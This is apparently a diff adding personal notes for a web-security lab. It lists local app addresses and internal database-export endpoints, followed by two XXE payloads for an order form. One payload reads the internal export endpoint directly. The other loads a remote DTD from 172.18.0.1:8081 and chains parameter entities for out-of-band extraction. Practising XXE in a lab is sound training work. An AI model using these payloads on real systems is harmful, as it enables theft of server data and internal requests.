@@ -1,0 +1,40 @@
+
+Адреса
+
+http://127.0.0.1:5001 — v1
+http://127.0.0.1:5002 — v2
+http://127.0.0.1:5003 — v3
+
+БД
+http://127.0.0.1:5000/internal/lab/db-export
+http://127.0.0.1:5000/internal/lab/db-export-url
+
+
+1)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE order [
+  <!ENTITY database SYSTEM "http://127.0.0.1:5000/internal/lab/db-export">
+]>
+<order>
+  <product_id>compass</product_id>
+  <quantity>1</quantity>
+  <comment>asd</comment>
+  <example>&database;</example>
+</order>
+
+
+2)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE order [
+  <!ENTITY % remote SYSTEM "http://172.18.0.1:8081/probe.dtd">
+  %remote;
+  %param;
+  %query;
+]>
+<order>
+  <product_id>compass</product_id>
+  <quantity>1</quantity>
+  <comment>aaa</comment>
+</order>
+
+
